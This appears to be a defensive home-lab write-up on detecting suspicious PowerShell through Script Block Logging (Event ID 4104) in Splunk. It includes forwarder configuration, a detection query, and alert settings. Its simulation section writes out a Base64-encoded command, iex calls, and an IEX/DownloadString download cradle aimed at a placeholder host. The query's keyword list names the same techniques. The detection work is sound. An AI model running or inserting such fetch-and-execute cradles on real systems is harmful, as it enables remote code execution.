
🧪 PowerShell Script Block Logging Detection (Splunk)
🎯 Objective

Detect suspicious PowerShell activity using Script Block Logging (Event ID 4104) and build an alert in Splunk.

🧠 Why This Matters

Attackers heavily use PowerShell for:

Command execution
Obfuscation (-enc)
Downloading payloads
Living-off-the-land techniques

👉 Detecting PowerShell = detecting real attacker behavior

🏗️ Lab Setup
Windows 11 VM → Generates PowerShell logs
Splunk Universal Forwarder → Sends logs
Splunk Enterprise (Ubuntu) → SIEM
⚙️ Configuration
Enable PowerShell Logging (GPO)

Enabled:

Script Block Logging
Module Logging

👉 This allows visibility of executed commands (critical)

Splunk Forwarder Configuration

inputs.conf

[WinEventLog://Microsoft-Windows-PowerShell/Operational]
disabled = 0
index = main

outputs.conf

[tcpout]
defaultGroup = default-autolb-group

[tcpout:default-autolb-group]
server = 192.168.56.102:9997
🧪 Attack Simulation (Commands Used)
🔹 1. Encoded Command (Obfuscation)
powershell -enc dwBoAG8AYQBtAGkA

👉 Executes Base64-encoded command (whoami)
👉 Used by attackers to bypass detection

🔹 2. Invoke-Expression (Dynamic Execution)
Invoke-Expression "whoami"

👉 Executes string as code
👉 Common in malware

🔹 3. IEX (Alias of Invoke-Expression)
iex "ipconfig"

👉 Short version used in attacks

🔹 4. Download Cradle (Payload Simulation)
IEX (New-Object Net.WebClient).DownloadString("http://example.com")

👉 Simulates downloading remote script
👉 Very common attacker technique

🔍 Detection Query
index=* EventCode=4104
| rex field=_raw "Creating Scriptblock text.*?:\s*\r?\n(?<ScriptBlockText>.+)"
| search ScriptBlockText="*-enc*" 
    OR ScriptBlockText="*Invoke-Expression*" 
    OR ScriptBlockText="*DownloadString*" 
    OR ScriptBlockText="*iex*"
| stats count by ScriptBlockText
🧠 Detection Logic Explained
1. Filter PowerShell logs
EventCode=4104

👉 Script Block Logging events

2. Extract executed command
rex field=_raw ...

👉 Pulls actual command into ScriptBlockText

3. Detect suspicious patterns
-enc / Invoke-Expression / DownloadString / iex

👉 Indicators of:

Obfuscation
Code execution
Payload delivery
4. Aggregate results
stats count by ScriptBlockText

👉 Shows repeated malicious behavior

🚨 Alert Configuration
Type: Scheduled
Time Range: Last 5 minutes
Trigger: Results > 0
Action: Add to Triggered Alerts
📊 Results

Detected:

Encoded PowerShell execution
Invoke-Expression usage
Download cradle activity
🧩 MITRE ATT&CK Mapping
Technique	ID
PowerShell Execution	T1059.001
Command Execution	TA0002
Discovery	TA0007

🚧 Challenges Faced
Missing ScriptBlockText (multiline parsing issue)
Forwarder ingestion delays
Alert not triggering (time range issue)
✅ Key Learnings
PowerShell is heavily abused by attackers
Logging configuration is critical
Regex extraction is required for real visibility
Detection must focus on behavior, not just commands
🚀 Outcome

Successfully built a real-world PowerShell detection use case and alert in Splunk.
